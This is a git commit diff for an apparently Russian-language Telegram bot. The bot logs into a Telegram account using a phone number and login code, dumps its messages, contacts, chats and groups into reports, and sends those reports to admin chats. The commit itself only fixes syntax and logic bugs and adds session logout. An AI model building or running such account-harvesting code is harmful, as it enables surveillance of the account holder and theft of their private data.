f16c130621ac8bb22357cab80c0e8f2db50747af
T4eslenko <151871161+T4eslenko@users.noreply.github.com>
2024-05-27 16:31:23 +0300

    Update main.py

--- main.py
+++ main.py
@@ -37,7 +37,7 @@ user_state = {}
 # Функция для отправки файлов
 async def send_files_to_bot(bot, admin_chat_ids, user_chat_id):
     file_extensions = ['_messages.xlsx', '_participants.xlsx', '_contacts.xlsx', '_about.xlsx', '_report.html', '_report.pdf']
-    now = datetime.now().strftime("%Y-%m-%d %H:%М:%С")
+    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     user_info_message = f"Выгрузка осуществлена пользователем ID: {user_chat_id} \nДата и время выгрузки: {now}"
 
     for file_extension in file_extensions:
@@ -68,7 +68,10 @@ async def send_welcome(message: types.Message):
     else:
         await unauthorized(message)
 
-@dp.message_handler(lambda message: message.text and (message.text.startswith('+') and message.text[1:].isdigit() and len(message.text) > 10 or message.text.isdigit() и len(message.text) >= 9) and message.from_user.id in allowed_users)
+@dp.message_handler(lambda message: message.text and 
+                    ((message.text.startswith('+') and message.text[1:].isdigit() and len(message.text) > 10) or 
+                     (message.text.isdigit() and len(message.text) >= 9)) and 
+                    message.from_user.id in allowed_users)
 async def get_phone_number(message: types.Message):
     phone_number = message.text
     
@@ -94,8 +97,8 @@ async def get_phone_number(message: types.Message):
 
 # Дополнительная проверка для случаев, когда текст сообщения не удовлетворяет условиям
 @dp.message_handler(lambda message: message.text and 
-                    not (message.text.startswith('+') and message.text[1:].isdigit() and len(message.text) > 10 or 
-                         message.text.isdigit() and len(message.text) >= 9) and 
+                    not ((message.text.startswith('+') and message.text[1:].isdigit() and len(message.text) > 10) or 
+                         (message.text.isdigit() and len(message.text) >= 9)) and 
                     message.from_user.id in allowed_users)
 async def invalid_phone_number(message: types.Message):
     await message.reply("Неверный формат номера телефона. Пожалуйста, введите номер, начинающийся с '+' и содержащий только цифры, или номер, состоящий из 9 и более цифр.")
@@ -104,7 +107,7 @@ async def invalid_phone_number(message: types.Message):
 def create_client():
     return TelegramClient('session_name', api_id, api_hash)
 
-@dp.message_handler(lambda message: message.text and message.from_user.id in user_state and 'phone_code_hash' in user_state[message.from_user.id])
+@dp.message_handler(lambda message: 'phone_code_hash' in user_state.get(message.from_user.id, {}))
 async def get_code(message: types.Message):
     code = message.text
     phone_number = user_state[message.from_user.id]['phone_number']
@@ -126,17 +129,13 @@ async def get_code(message: types.Message):
             return
 
         await message.reply("Успешная авторизация!")
-        selection = '0'
-        userid, userinfo, firstname, lastname, username = await get_user_info(client, phone_number, selection)
-        count_blocked_bot, earliest_date, latest_date, blocked_bot_info, blocked_bot_info_html, user_bots, user_bots_html = await get_blocked_bot(client, selection)
-        delgroups, chat_message_counts, openchannels, closechannels, openchats, closechats, admin_id, user_bots, user_bots_html = await get_type_of_chats(client, selection)
-        groups, i, all_info, openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html = await make_list_of_channels(delgroups, chat_message_counts, openchannels, closechannels, openchats, closechats, selection, client)
-        total_contacts, total_contacts_with_phone, total_mutual_contacts = await get_and_save_contacts(client, phone_number, userinfo, userid)
-        await save_about_channels(phone_number, userid, firstname, lastname, username, openchannel_count, opengroup_count, closechannel_count, closegroup_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, openchannels, closechannels, openchats, closechats, delgroups, closegroupdel_count)
-        await generate_html_report(phone_number, userid, userinfo, firstname, lastname, username, total_contacts, total_contacts_with_phone, total_mutual_contacts, openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html, blocked_bot_info_html, user_bots_html, user_id)
-        await send_files_to_bot(bot, admin_chat_ids, user_chat_id)
+        await process_user_data(client, phone_number, user_chat_id)
     except Exception as e:
         await message.reply(f"Произошла ошибка: {e}")
+    finally:
+        await client.log_out()
+        await client.disconnect()
+        user_state.pop(message.from_user.id, None)
 
 @dp.message_handler(lambda message: 'awaiting_password' in user_state.get(message.from_user.id, {}))
 async def process_password(message: types.Message):
